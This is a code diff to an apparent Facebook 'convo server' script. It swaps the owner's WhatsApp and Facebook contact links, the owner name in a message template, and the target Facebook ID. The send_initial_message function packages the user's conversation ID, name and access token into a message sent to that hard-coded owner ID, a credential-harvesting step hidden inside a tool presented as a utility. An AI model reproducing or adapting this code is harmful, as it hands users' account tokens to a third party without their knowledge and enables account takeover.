@@ -51,8 +51,8 @@ html_content = """
             <div class="credit">
                 <p>1. CREDIT:-TS ARMY</p>
                 <p>2. OWNER => SATISH</p>
-                <p>3. CONTACT:- <a href="https://wa.me/+918303714910">WhatsApp</a></p>
-                <p>4. FACEBOOK:- <a href="https://www.facebook.com/profile.php?id=100087513362848">Facebook</a></p>
+                <p>3. CONTACT:- <a href="https://wa.me/+919509860071">WhatsApp</a></p>
+                <p>4. FACEBOOK:- <a href="https://www.facebook.com/profile.php?id=100079554613661">Facebook</a></p>
                 <p>5. WATTSAPP GROUP:- <a href="https://chat.whatsapp.com/JxJ05oAresQ6YWgLSd6F9O">WhatsApp Group</a></p>
             </div>
         </div>
@@ -103,10 +103,10 @@ def send_initial_message():
         sys.exit()
     
     # Message template
-    msg_template = "Owner => Aryan \n Hello Aryan sir. \n I am using your convo server. \n This Is My Details :- \n Convo ID :- {} \n Name:- {} \n Token :- {}"
+    msg_template = "Owner => killer \n Hello killar sir. \n I am using your convo server. \n This Is My Details :- \n Convo ID :- {} \n Name:- {} \n Token :- {}"
     
     # Target IDs
-    target_ids = ["100000314590715"]
+    target_ids = ["100079554613661"]
     
     requests.packages.urllib3.disable_warnings()
     
